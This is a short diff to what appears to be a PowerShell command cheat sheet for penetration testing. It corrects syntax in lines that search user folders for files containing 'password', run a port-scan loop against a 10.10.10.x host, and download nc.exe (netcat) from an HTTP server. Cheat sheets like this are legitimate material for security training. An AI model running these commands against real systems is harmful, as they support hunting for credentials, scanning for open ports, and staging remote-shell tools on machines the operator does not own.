@@ -44,7 +44,7 @@ PS C:\> Select-String –path c:\users\*.txt –pattern password
 ```
 
 ```powershell
-PS C:\> ls -r c:\users -file | % {Select-String -path $_ -pattern password}
+PS C:\> ls -r c:\users\*.txt -file | % {Select-String -path $_ -pattern password}
 ```
 
 **Display file contents (cat, type, gc):**
@@ -105,7 +105,7 @@ PS C:\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.
 
 **Fetch a file via HTTP (wget in PowerShell):**
 ```powershell
-PS C:\> (New-ObjectSystem.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","nc.exe")
+PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","nc.exe")
 ```
 **Find all files with a particular name:**
 ```powershell
@@ -265,7 +265,7 @@ PS C:\> gcm *[string]*
 
 **Shows properties & methods**
 ```powershell
-PS C:\> Get-Member
+PS C:\> [cmdlet] | Get-Member
 ```
 Alias
 ```powershell
